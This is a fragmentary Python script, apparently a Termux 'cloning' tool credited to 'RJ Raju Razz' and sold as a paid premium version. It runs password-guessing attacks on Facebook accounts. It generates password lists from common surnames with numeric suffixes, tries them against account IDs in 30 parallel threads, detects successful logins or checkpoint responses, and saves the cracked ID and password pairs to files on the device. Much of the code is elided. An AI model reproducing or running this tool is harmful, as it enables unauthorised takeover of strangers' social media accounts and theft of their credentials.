...
\033[38;5;49m═════════════════════════════════════
\033[38;5;47m     [✔]𝙍𝙅 𝙍𝘼𝙅𝙐 𝙍𝘼𝙕𝙕😱
\033[38;5;47m     [✔]𝗩𝗘𝗥𝗦𝗜𝗢𝗡 {5.1}🎉
\033[38;5;47m     [✔]𝘿𝘼𝙏𝘼 & 𝙒𝙄𝙁𝙄 𝙒𝙊𝙍𝙆𝙄𝙉𝙂💯
\033[38;5;47m     [✔]𝐏𝐀𝐈𝐃 𝐂𝐎𝐌𝐌𝐀𝐍𝐃😈☝❤
\033[38;5;47m     [✔]𝐅𝐑𝐎𝐌 𝘼𝙎𝙎𝘼𝙈, 𝙄𝙉𝘿𝙄𝘼🇮🇳🥀
\033[38;5;49m═════════════════════════════════════
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://t.me/EvilEyeHackers{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://t.me/EvilEyeHackers');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open RJ Raju Razz');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print("\033[1;31m You Are a Not Premium User...!\033[1;37m");time.sleep(1)
                        clear()
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+919954282827&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RJ Sir, I Need To Buy Your Paid FUCK YOU Tool Version 5.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Fuck.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'dasdas','das1122','das12345','das1234','das12','das786','das123','das123456','dasdas123','786786']
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: das, baishya, chutia, saikia\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: baishya, das, chutia \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RJ Raju Razz-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK] %s | %s'%(ids,pas))
                                open('/sdcard/𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝙍𝙅 𝙍𝙖𝙟𝙪 𝙀𝙖𝙯𝙯-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [𝙍𝙅 𝙍𝙖𝙟𝙪 𝙍𝙖𝙯𝙯-OK] '+uid+' | '+pas+'\033[1;97m')
